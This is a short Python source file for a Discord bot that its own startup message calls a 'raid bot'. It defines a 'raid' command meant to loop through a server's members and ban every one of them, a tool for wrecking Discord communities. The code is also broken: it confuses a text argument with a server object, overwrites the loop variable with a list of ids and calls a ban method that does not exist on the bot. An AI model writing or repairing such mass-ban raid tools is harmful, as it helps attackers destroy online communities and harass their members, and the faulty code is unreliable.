import discord
import asyncio

from discord.ext import commands

bot = commands.Bot(command_prefix='r')


@bot.listen()
async def on_ready():
    print('raid bot prêt')


@bot.command(pass_context = True)
async def raid(ctx,*,guild):
  for member in ctx.guild.members:
    member = [member.id for member in guild.members]   
    await bot.ban(member)
    

    
    


bot.run('token')

